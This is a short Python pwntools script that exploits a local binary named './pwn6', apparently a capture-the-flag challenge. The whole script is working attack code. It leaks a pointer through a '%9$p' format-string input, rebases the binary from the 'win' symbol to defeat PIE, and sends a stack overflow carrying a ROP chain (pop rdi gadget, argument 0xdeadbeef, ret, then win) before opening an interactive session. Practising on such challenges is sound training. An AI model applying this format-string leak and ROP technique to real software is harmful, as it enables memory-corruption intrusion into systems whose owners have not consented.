from pwn import *

binary = "./pwn6"

e = ELF(binary)

r = process(binary)

print(r.recv().decode())
r.sendline("%9$p")
leak = int(r.recv(), 16)
e.address = leak - e.symbols['win']
re = ROP(binary)
pop_rdi_gadget = e.address + re.find_gadget(["pop rdi"])[0]
ret_gadget = e.address + re.find_gadget(["ret"])[0]
print(hex(leak), hex(e.address))
payload = flat("A"*32,"B"*8, p64(pop_rdi_gadget), p64(0xdeadbeef), p64(ret_gadget), p64(leak))
r.sendline(payload)
r.interactive()
